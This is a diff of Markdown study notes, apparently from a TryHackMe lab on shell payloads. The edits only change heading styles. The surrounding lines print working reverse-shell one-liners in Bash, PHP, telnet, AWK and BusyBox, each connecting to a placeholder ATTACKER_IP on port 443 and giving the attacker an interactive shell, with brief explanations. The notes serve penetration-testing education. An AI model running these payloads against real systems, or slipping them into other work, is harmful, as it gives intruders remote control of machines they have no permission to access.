@@ -602,7 +602,7 @@ ncat
 ## Shell Payloads
 
 
-**Bash**
+### Bash
 
 **Normal Bash Reverse Shell**
 
@@ -637,7 +637,7 @@ target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.
 ---
 
-**PHP**
+### PHP
 
 **PHP Reverse Shell Using the exec Function**
 
@@ -680,7 +680,8 @@ target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3
 ```
 This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.
 ---
-**Python**
+### python
+
 ﻿Please note, the following snippets below require using python -c to run, indicated by the placeholder PY-C
 Python Reverse Shell by Exporting Environment Variables
 
@@ -705,20 +706,20 @@ This reverse shell creates a socket (s), connects to the attacker, and redirects
 
 Others
 ---
-**Telnet**
+### Telnet
 
 ```bash
 target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
 ```
 This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 
 ---
-**AWK**
+### AWK
 ```bash
 target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.
 ---
-**BusyBox**
+### BusyBox
 
 ```bash
 target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
